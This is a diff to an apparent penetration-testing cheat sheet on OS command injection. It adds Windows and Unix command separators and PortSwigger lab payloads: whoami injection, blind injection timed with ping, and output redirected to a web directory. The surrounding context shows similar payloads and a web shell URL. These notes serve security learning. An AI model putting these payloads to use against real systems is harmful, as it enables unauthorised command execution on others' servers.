@@ -34,6 +34,18 @@ ip=127.0.0.1;wh$()oami
 time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"
 
 ```
+```
+The following command separators work on both Windows and Unix-based systems:
+&
+&&
+|
+||
+
+The following command separators work only on Unix-based systems:
+;
+Newline (0x0a or \n)
+```
+
 #### Common Capability Checks
 - Linux 
 
@@ -228,4 +240,26 @@ http://192.168.152.121/backups/cmd.php?cmd=ls
 ##### **OS Command Injection**
 ```
 C:\backup"&type C:\proof.txt
+```
+
+
+#### Portswigger labs
+
+- ##### OS command injection, simple case
+```
+productId=1&storeId=2|whoami
+```
+
+- ##### Detecting blind OS command injection using time delays
+```
+name=Tom&email=x||ping+-c+10+127.0.0.1||&subject=Test&message=TestMSG
+```
+
+
+- ##### Exploiting blind OS command injection by redirecting output
+```
+email=||whoami>/var/www/images/output.txt||
+
+Read it:
+filename=output.txt
 ```
